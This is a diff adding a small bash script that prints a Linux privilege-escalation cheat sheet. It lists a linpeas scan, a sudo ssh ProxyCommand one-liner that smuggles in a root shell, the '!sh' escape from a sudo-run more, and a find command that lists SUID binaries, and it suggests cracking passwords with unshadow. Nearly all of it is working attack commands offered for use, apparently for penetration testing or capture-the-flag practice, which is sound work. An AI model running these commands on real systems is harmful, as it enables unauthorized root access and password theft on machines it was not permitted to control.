@@ -1,0 +1,16 @@
+#!/bin/bash
+
+echo "Here are some tricks and tools you can use for privilege escalation"
+echo ""
+echo "	(1) Use linpeass.sh. A general privilege escalation scan"
+echo "		linpeass.sh"
+echo ""
+echo "	(2) Root ssh shell. If you have root ssh privileges, the following command will yield a root shell"
+echo "		sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
+echo ""
+echo "	(3) Use more. If you can sudo use more to read a file, you can run this command (while in more) to get root shell:"
+echo "		!sh"
+echo "	(4) See if you can use any tools that have SUID bit with the command:"
+echo "		find / -type f -perm -04000 -ls 2>/dev/null"
+echo "	      Can be used in conjunction with unshadow to crack passwords."
+echo "	      See also: https://gtfobins.github.io/"
